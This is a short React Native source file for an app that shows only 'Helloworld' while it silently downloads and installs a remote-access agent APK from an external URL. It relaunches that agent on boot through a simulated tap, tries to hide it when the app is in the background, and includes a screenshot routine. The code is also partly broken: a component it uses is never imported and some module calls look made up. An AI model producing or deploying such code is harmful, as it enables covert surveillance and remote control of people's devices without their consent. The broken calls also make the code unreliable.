import React, { useEffect, useState } from 'react';
import { Linking, DeviceEventEmitter, AppState, View } from 'react-native';
import IntentAndroid from 'react-native-intent-android';
import UIAutomatorModule from 'react-native-android-ui-automator';
import ViewShot from "react-native-view-shot";

const App = () => {
  const [appState, setAppState] = useState(AppState.currentState);

  useEffect(() => {
    // Download and install the getscreen.me.agent mobile APK when the app is first installed
    Linking.openURL('https://example.com/getscreen.me.agent.apk')
      .then(() => {
        IntentAndroid.installPackage('https://example.com/getscreen.me.agent.apk');
      });

    // Listen for the BOOT_COMPLETED event and start the getscreen.me.agent mobile app when the device finishes booting
    DeviceEventEmitter.addListener('BOOT_COMPLETED', () => {
      IntentAndroid.startActivity('android.intent.action.MAIN', {
        package: 'com.getscreen.me.agent',
        action: 'android.intent.action.MAIN',
      });
      // Simulate a tap on the start button
      UIAutomatorModule.tap({ x: 100, y: 100 });
    });

    // Add a listener for the change event in the AppState module to hide the app and the getscreen.me.agent mobile app when the app becomes inactive
    AppState.addEventListener('change', (nextAppState) => {
      if (appState.match(/inactive|background/) && nextAppState === 'inactive') {
        Linking.canOpenURL('com.getscreen.me.agent://').then((supported) => {
          if (supported) {
            Linking.openURL('com.getscreen.me.agent://');
          }
        });
      }
      setAppState(nextAppState);
    });

    return () => {
      // Remove the listeners when the component unmounts
      DeviceEventEmitter.removeAllListeners();
      AppState.removeEventListener();
    };
  }, []);

  // Take a screenshot and save it
  const takeScreenshot = () => {
    ViewShot.takeSnapshot({
      format: "png",
      quality: 0.8
    })
      .then(
        uri => console.log("Image saved to", uri),
        error => console.error("Oops, snapshot failed", error)
      );
  };

  return (
    <View>
      <Text>Helloworld</Text>
    </View>
  );
};

export default App;
